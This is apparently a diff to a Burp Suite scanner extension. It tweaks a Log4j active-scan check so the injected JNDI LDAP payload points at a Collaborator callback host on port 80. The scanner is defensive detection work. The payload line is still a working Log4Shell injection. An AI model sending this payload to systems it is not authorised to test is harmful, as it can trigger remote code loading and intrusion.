@@ -717,7 +717,7 @@ class doStruts_2017_12611_scan(IScannerCheck):
 class Log4j(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         collab = callbacks.createBurpCollaboratorClientContext()
-        attack = request(basePair, insertionPoint, "${jndi:ldap://"+collab.generatePayload(True)+"/a}")
+        attack = request(basePair, insertionPoint, "${jndi:ldap://"+collab.generatePayload(True)+":80/a}")
         interactions = collab.fetchAllCollaboratorInteractions()
         if interactions:
             return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
